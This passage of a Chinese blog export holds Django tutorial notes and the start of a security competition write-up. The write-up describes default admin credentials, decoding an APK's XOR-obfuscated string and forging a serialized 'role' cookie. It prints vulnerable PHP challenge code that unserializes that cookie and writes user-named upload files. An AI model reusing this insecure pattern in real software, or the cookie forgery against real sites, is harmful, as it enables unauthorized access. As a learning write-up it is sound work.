class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.name</span><br><span class=\"line\">    <span class=\"comment\"># def __str__(self):</span></span><br><span class=\"line\">    <span class=\"comment\">#     return self.name</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">New</span><span class=\"params\">(models.Model)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># 文章标题</span></span><br><span class=\"line\">    title = models.CharField(max_length=<span class=\"number\">70</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 文章正文，我们使用了 TextField。</span></span><br><span class=\"line\">    <span class=\"comment\"># 存储比较短的字符串可以使用 CharField，但对于文章的正文来说可能会是一大段文本，因此使用 TextField 来存储大段文本。</span></span><br><span class=\"line\">    body = models.TextField()</span><br><span class=\"line\">    <span class=\"comment\"># 这两个列分别表示文章的创建时间和最后一次修改时间，存储时间的字段用 DateTimeField 类型。</span></span><br><span class=\"line\">    created_time = models.DateTimeField()</span><br><span class=\"line\">    modified_time = models.DateTimeField()</span><br><span class=\"line\">    <span class=\"comment\"># 文章摘要，可以没有文章摘要，但默认情况下 CharField 要求我们必须存入数据，否则就会报错。</span></span><br><span class=\"line\">    <span class=\"comment\"># 指定 CharField 的 blank=True 参数值后就可以允许空值了。</span></span><br><span class=\"line\">    excerpt = models.CharField(max_length=<span class=\"number\">200</span>, blank=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 这是分类与标签，分类与标签的模型我们已经定义在上面。</span></span><br><span class=\"line\">    <span class=\"comment\"># 我们在这里把文章对应的数据库表和分类、标签对应的数据库表关联了起来，但是关联形式稍微有点不同。</span></span><br><span class=\"line\">    <span class=\"comment\"># 我们规定一篇文章只能对应一个分类，但是一个分类下可以有多篇文章，所以我们使用的是 ForeignKey，即一对多的关联关系。</span></span><br><span class=\"line\">    <span class=\"comment\"># 而对于标签来说，一篇文章可以有多个标签，同一个标签下也可能有多篇文章，所以我们使用 ManyToManyField，表明这是多对多的关联关系。</span></span><br><span class=\"line\">    <span class=\"comment\"># 同时我们规定文章可以没有标签，因此为标签 tags 指定了 blank=True。</span></span><br><span class=\"line\">    <span class=\"comment\"># 如果你对 ForeignKey、ManyToManyField 不了解，请看教程中的解释，亦可参考官方文档：</span></span><br><span class=\"line\">    <span class=\"comment\"># https://docs.djangoproject.com/en/1.10/topics/db/models/#relationships</span></span><br><span class=\"line\">    category = models.ForeignKey(Category)</span><br><span class=\"line\">    tags = models.ManyToManyField(Tag, blank=<span class=\"keyword\">True</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 文章作者，这里 User 是从 django.contrib.auth.models 导入的。</span></span><br><span class=\"line\">    <span class=\"comment\"># django.contrib.auth 是 Django 内置的应用，专门用于处理网站用户的注册、登录等流程，User 是 Django 为我们已经写好的用户模型。+</span></span><br><span class=\"line\">    <span class=\"comment\"># 这里我们通过 ForeignKey 把文章和 User 关联了起来。</span></span><br><span class=\"line\">    <span class=\"comment\"># 因为我们规定一篇文章只能有一个作者，而一个作者可能会写多篇文章，因此这是一对多的关联关系，和 Category 类似。</span></span><br><span class=\"line\">    author = models.ForeignKey(User)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__unicode__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.title</span><br></pre></td></tr></table></figure></p>\n<p>在settings.py中查看数据库的配置信息，创建数据库<br>准备工作完成之后我们需要执行<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py makemigrations</span><br><span class=\"line\">$python manage.py migrate</span><br></pre></td></tr></table></figure></p>\n<p>所以我们直接在blog目录下的views.py中编写代码<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> django.shortcuts <span class=\"keyword\">import</span> render</span><br><span class=\"line\"><span class=\"keyword\">from</span> models <span class=\"keyword\">import</span> New</span><br><span class=\"line\"><span class=\"keyword\">from</span>  django.http <span class=\"keyword\">import</span> HttpResponse</span><br><span class=\"line\"><span class=\"keyword\">from</span> forms <span class=\"keyword\">import</span> AddForm</span><br><span class=\"line\"><span class=\"comment\"># Create your views here.</span></span><br><span class=\"line\"><span class=\"comment\">#直接使用Views 把数据推送到Template中进行浏览器显示</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">'欢迎来到博客首页！&lt;a href=\"/show\"&gt;show&lt;/a&gt; &lt;a href=\"/add\"&gt;add&lt;/a&gt;'</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    new_list=New.objects.all()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/show.html'</span>,&#123;<span class=\"string\">'new_list'</span>:new_list&#125;)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(request)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        form = AddForm(request.POST)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> form.is_valid():</span><br><span class=\"line\">            a=form.cleaned_data[<span class=\"string\">'a'</span>]</span><br><span class=\"line\">            b=form.cleaned_data[<span class=\"string\">'b'</span>]</span><br><span class=\"line\">            <span class=\"keyword\">return</span> HttpResponse(str(int(a)+int(b)))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        form=AddForm()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request,<span class=\"string\">'blog/add.html'</span>,&#123;<span class=\"string\">'form'</span>:form&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>代码的说明之后的内容会详细讲到，目前是先这样了解用着。<br>有了Views中的内容之后，我们怎样把它推送给客户浏览器上进行显示。<br>之后我们需要在blog目录下的urls.py中进行设置<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.conf.urls <span class=\"keyword\">import</span> url</span><br><span class=\"line\"><span class=\"keyword\">from</span> . <span class=\"keyword\">import</span> views</span><br><span class=\"line\">urlpatterns=[</span><br><span class=\"line\">    url(<span class=\"string\">r'^$'</span>,views.index,name=<span class=\"string\">'index'</span>),</span><br><span class=\"line\">    url(<span class=\"string\">r'^show/$'</span>,views.show),</span><br><span class=\"line\">    url(<span class=\"string\">r'^add/$'</span>,views.add),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p>我们来创建templates这里我们有两种的创建方式，一种是统一在项目的根目录下创建一个templates文件然后里面创建app的名字文件夹本例子中使用的就是这一种，还有一种就是在app blog目录下创建templates文件夹，只是在变代码的时候模板文件路径略有不同而已。<br>模板文件的代码show.html</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Title<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">border</span>=<span class=\"string\">\"1xp\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>标题<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>内容<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">        &#123;% for line in new_list %&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; line.title &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; line.body &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>add.html如下<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Title<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span>&gt;</span></span><br><span class=\"line\">    &#123;% csrf_token %&#125;</span><br><span class=\"line\">    &#123;&#123; form&#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"提交\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>需要使Django找打模板文件的路径<br>还需要在settings.py中设置DIRS<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TEMPLATES = [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"string\">'BACKEND'</span>: <span class=\"string\">'django.template.backends.django.DjangoTemplates'</span>,</span><br><span class=\"line\">        <span class=\"string\">'DIRS'</span>: [os.path.join(BASE_DIR, <span class=\"string\">'templates'</span>)],</span><br><span class=\"line\">        <span class=\"string\">'APP_DIRS'</span>: <span class=\"keyword\">True</span>,</span><br><span class=\"line\">        <span class=\"string\">'OPTIONS'</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">'context_processors'</span>: [</span><br><span class=\"line\">                <span class=\"string\">'django.template.context_processors.debug'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.template.context_processors.request'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.contrib.auth.context_processors.auth'</span>,</span><br><span class=\"line\">                <span class=\"string\">'django.contrib.messages.context_processors.messages'</span>,</span><br><span class=\"line\">            ],</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p>最后实现了一个简单的mvt模式，但是之中的内容还需要私下底查一些相关的资料，进行详细的学习。</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>本篇的学习，我们了解了Django的MVT模式，本篇的内容还得学习一些Django 中相关操作。代码上传到了github了<a href=\"https://github.com/Huseck/Django-study/tree/Django-study-2\" target=\"_blank\" rel=\"noopener\">https://github.com/Huseck/Django-study/tree/Django-study-2</a> 下载配置的问题需要把blog目录下migrations目录下的 inital.py之类的文件删除然后数据迁移<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$python manage.py makemigrations </span><br><span class=\"line\">$python manage.py migrate</span><br><span class=\"line\">$python manage.py runserver</span><br></pre></td></tr></table></figure></p>\n<p>如以下的相关知识点</p>\n<ol>\n<li>Django 处理Form表单的操作</li>\n<li>url正则的知识点</li>\n<li>模板代码 操作</li>\n<li>Django 怎么处理url参数的传递的</li>\n</ol>\n","categories":["Django"],"tags":["Django"]},{"title":"Django 学习笔记(一)","url":"https://www.xjseck.com/2018/01/26/Django-学习笔记-一/","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>1.2018年了，计划一下学习任务。</p>\n<p>深入学习Python<br>学习Django 或者Flask 框架进行Web项目的开发<br>深入学习PHP相关的黑科技和代码审计<br>渗透测试流程和技巧总结<br>社团相关的运营</p>\n<p>先学习Django<br>学习Django MVT 开发模式，主要学习Django的配置说明和app应用之间的耦合进行项目的组合。<br>进行快速的web项目开发。</p>\n<p><strong>基础知识点</strong><br>学习 前端相关知识点（html css js form表单）<br>学习 Python的一些基础语法点<br>学习 Linux 基础操作和命令<br>学习 数据库的相关操作<br>学习 HTTP协议的一些参数<br>学习 COOKIES SESSION 判断状态和权限<br>参考<br><code>http://python.usyiyi.cn/translate/django_182/index.html</code></p>\n<p><code>https://code.ziqiangxuetang.com/django/django-registration.html</code></p>\n<p>Django版本的一些特点<br>版本之间的改动，基本操作和相关的一些配置说明。</p>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><p>快速的掌握Django就是拿例子说明，先明白在Django框架下的相关操作的规则之后，在回过头来明白实现的机理。<br>例子（一）<br>环境window10 Python2.7</p>\n<p>1.先配置本机的Python隔离环境<br>    $pip install virtualenv<br>2.建立Django项目<br>    $pip install django<br>    本地环境变量设置一下<br>    C:\\Python27\\Lib\\site-packages\\django\\bin<br>    然后创建项目(相关的参数可以-h显示)<br>    $django-admin startproject django-project<br>    启动项目<br>    $python manage.py 8080<br>    浏览器输入地址显示hello world</p>\n<h3 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h3><p>从例子中先看看Django 默认创建项目的文件列表和代码中相关的配置</p>\n","categories":["Django"],"tags":["Django"]},{"title":"帮人代打的比赛","url":"https://www.xjseck.com/2017/12/28/帮人代打的比赛/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>好久没有更新博客了，这一段时间自己也比较懒，主要还是进行了两次比赛吧，东奔西跑的。也很难让自己沉淀下来。就简单的总结一下比赛的过程，然后发现自己的不足。  </p>\n<h3 id=\"关于比赛\"><a href=\"#关于比赛\" class=\"headerlink\" title=\"关于比赛\"></a>关于比赛</h3><p><strong>CNAS T0832网络安全等级保护测评能力验证与攻防大赛</strong><br><strong>2017年中关村信息安全测评联盟测评能力验证与攻防大赛</strong><br><strong>2017年工业信息安全技能大赛</strong><br>一场比赛,一场懵逼，一场比赛，一场菜。<br>首先说一下第一场比赛感觉和解题过程。<br><img src=\"1.jpg\" alt=\"\"><br><img src=\"4.png\" alt=\"\"><br><img src=\"5.png\" alt=\"\"><br>比赛是在北京双十一当天的下午。进行WEB解题，从技术支撑I春秋就能发现，类似CTF-WEB题，共十道题，难度又长又短吧。比赛当时队伍中也是我一个人在解题，时间上肯定是不够用的。<br><strong>题目一(身份鉴别)</strong><br>直接信息收集 robots.txt获得后台登录界面，然后bp抓包，也该源代码中有提示admin/admin登录成功getflag  </p>\n<p><strong>题目二(安全审计)</strong><br>题目提示是有小黑攻入web服务，放置了app留有后门，通过扫描之后发现access.log和error.log日志文件里面有apk 的地址，下载app进行逆向分析，当时是使用的dex2jar+jd-gui进行反编译的，出现了问题，事后复现了一下，使用jeb这个或者android_kill进行反编译比较方便一些。<br><img src=\"2.png\" alt=\"\"><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MainActivity</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle arg6)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> v3 = <span class=\"number\">56</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] v0 = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[]&#123;<span class=\"number\">150</span>, <span class=\"number\">161</span>, <span class=\"number\">180</span>, <span class=\"number\">164</span>, <span class=\"number\">150</span>, <span class=\"number\">255</span>, <span class=\"number\">191</span>, <span class=\"number\">248</span>, <span class=\"number\">130</span>, <span class=\"number\">152</span>, <span class=\"number\">142</span>, <span class=\"number\">161</span>, <span class=\"number\">129</span>, <span class=\"number\">136</span>, <span class=\"number\">137</span>, <span class=\"number\">255</span>, <span class=\"number\">129</span>, <span class=\"number\">165</span>, <span class=\"number\">252</span>, <span class=\"number\">187</span>, <span class=\"number\">130</span>, <span class=\"number\">152</span>, <span class=\"number\">153</span>, <span class=\"number\">180</span>, <span class=\"number\">128</span>, <span class=\"number\">152</span>, <span class=\"number\">157</span>, <span class=\"number\">187</span>, <span class=\"number\">130</span>, <span class=\"number\">166</span>, <span class=\"number\">137</span>, <span class=\"number\">184</span>, <span class=\"number\">149</span>, <span class=\"number\">161</span>, <span class=\"number\">137</span>, <span class=\"number\">255</span>, <span class=\"number\">150</span>, <span class=\"number\">165</span>, <span class=\"number\">252</span>, <span class=\"number\">254</span>, <span class=\"number\">130</span>, <span class=\"number\">152</span>, <span class=\"number\">137</span>, <span class=\"number\">181</span>, <span class=\"number\">149</span>, <span class=\"number\">166</span>, <span class=\"number\">175</span>, <span class=\"number\">180</span>, <span class=\"number\">150</span>, <span class=\"number\">136</span>, <span class=\"number\">154</span>, <span class=\"number\">166</span>, <span class=\"number\">130</span>, <span class=\"number\">166</span>, <span class=\"number\">168</span>, <span class=\"number\">245</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> v1;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(v1 = <span class=\"number\">0</span>; v1 &lt; v3; ++v1) &#123;</span><br><span class=\"line\">            v0[v1] ^= <span class=\"number\">204</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> String(Base64.decode(v0.toString(), <span class=\"number\">0</span>));</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(arg6);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.setContentView(<span class=\"number\">2130968603</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里就很容易的发现是对204进行异或，只要再进行一次异或就能知道原来的数据<br>Python写一个脚本<br><img src=\"3.png\" alt=\"\"></p>\n<p><strong>题目三(访问控制与授权)</strong></p>\n<ul>\n<li>首先抓包进行分析，cookie中有一个role参数进行base解码s:5:”guest” 所以替换成admin传入得到源代码</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$role = <span class=\"string\">\"guest\"</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">\"flag&#123;???&#125;\"</span>;</span><br><span class=\"line\">$auth = <span class=\"keyword\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">\"role\"</span>]))&#123;</span><br><span class=\"line\">    $role = unserialize(base64_decode($_COOKIE[<span class=\"string\">\"role\"</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($role === <span class=\"string\">\"admin\"</span>)&#123;</span><br><span class=\"line\">        $auth = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $auth = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $role = base64_encode(serialize($role));</span><br><span class=\"line\">    setcookie(<span class=\"string\">'role'</span>,$role);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($auth)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'filename'</span>]))&#123;</span><br><span class=\"line\">        $filename = $_POST[<span class=\"string\">'filename'</span>];</span><br><span class=\"line\">        $data = $_POST[<span class=\"string\">'data'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'[&lt;&gt;?]'</span>, $data)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'No No No!'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $s = implode($data);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'[&lt;&gt;?]'</span>, $s))&#123;</span><br><span class=\"line\">                $flag=<span class=\"string\">\"None.\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $rand = rand(<span class=\"number\">1</span>,<span class=\"number\">10000000</span>);</span><br><span class=\"line\">            $tmp=<span class=\"string\">\"./uploads/\"</span>.md5(time() + $rand).$filename;</span><br><span class=\"line\">            file_put_contents($tmp, $flag);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"your file is in \"</span> . $tmp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Hello admin, now you can upload something you are easy to forget.\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br /&gt;there are the source.&lt;br /&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;textarea rows=\"10\" cols=\"100\"&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> htmlspecialchars(str_replace($flag,<span class=\"string\">'flag&#123;???&#125;'</span>,file_get_contents(<span class=\"keyword\">__FILE__</span>)));</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;/textarea&gt;'</span>;+</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Sorry. You have no permissions.\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>首先是绕过data里面的值$s = implode($data); 可以看出是数组才有返回值，然后才能过<br><code>if(!preg_match(‘[&lt;&gt;?]’, 